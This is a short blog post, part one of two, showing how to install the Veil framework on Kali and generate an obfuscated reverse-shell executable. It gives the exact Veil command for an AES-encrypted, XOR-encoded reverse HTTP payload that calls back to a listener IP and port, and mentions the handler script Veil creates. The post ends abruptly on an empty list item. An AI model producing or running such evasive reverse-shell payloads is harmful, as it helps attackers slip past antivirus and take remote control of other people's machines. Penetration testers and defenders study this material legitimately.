+++
title = "Reverse Shell with Code Obfuscating Part 1 of 2"
date = 2018-01-06T19:15:55-05:00
draft = false
comments = true
categories = ["Security OS", "Tools"] 
description = "" 
tags = ["encryption", "kali", "persistence"]
image = "/img/remote-shell/code-obfuscating.jpg"

+++

## Reverse Shell with Code Obfuscating Part 1 of 2

Veil is the union of two programs, Veil-Evasion and Veil-Ordnance. ...

### Create the payload using the Veil Framework

- Download Veil `sudo apt-get update && sudo apt-get install veil`. It may take a while, it will download a lot of dependencies like ... Veil should be located in /usr/share/veil.

- To list Veil-Evasion payloads `./Veil.py -t Evasion --list-payloads`. To create the payload, we can use the Veil command line `./Veil.py -t Evasion -p 29 --ordnance-payload rev_http --ip 192.168.0.101 --port 19370 -e xor -b \\x00\\x0a -o filename` where 29 corresponds to the /python/shellcode_inject/aes_script payload. The script will create the executable file and a resource script file for c++ (.rc) that creates the handler that waits for an incoming connexion.

4. ``